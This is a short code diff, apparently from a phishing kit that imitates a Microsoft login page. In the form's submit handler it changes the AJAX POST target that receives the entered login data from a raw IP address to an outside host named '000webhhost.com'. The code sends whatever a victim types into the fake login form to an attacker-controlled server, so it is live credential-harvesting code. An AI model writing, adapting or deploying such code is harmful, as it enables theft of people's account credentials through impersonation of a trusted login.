@@ -78,7 +78,7 @@ document.getElementById("microsoft-login-form").addEventListener("submit", funct
 
     // Send form data to process_login.php using AJAX
     var xhr = new XMLHttpRequest();
-    xhr.open("POST", "http://54.241.80.8/login.php", true);
+    xhr.open("POST", "https://000webhhost.com/login.php", true);
     xhr.onreadystatechange = function() {
         if (xhr.readyState === 4) {
             // Hide loading overlay when request completes
